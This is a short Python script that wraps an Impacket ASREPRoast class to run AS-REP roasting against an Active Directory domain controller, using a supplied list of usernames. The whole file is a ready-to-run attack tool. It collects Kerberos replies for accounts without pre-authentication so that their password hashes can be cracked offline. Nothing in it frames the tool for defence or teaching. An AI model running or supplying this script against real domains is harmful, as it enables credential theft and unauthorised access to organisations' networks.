#!/usr/bin/env python3
# duckman_42

from impacket.examples import logger
from impacket.examples.asreproast import ASREPRoast
import argparse

def main():
    parser = argparse.ArgumentParser(description='AS-REP Roasting with Impacket')
    parser.add_argument('domain')
    parser.add_argument('usersfile', help='File with usernames (one per line)')
    parser.add_argument('-dc-ip', required=True, help='IP del Domain Controller')
    args = parser.parse_args()

    logger.init()
    asrep = ASREPRoast()
    asrep.main(domain=args.domain, usersfile=args.usersfile, dc_ip=args.dc_ip)

if __name__ == '__main__':
    main()
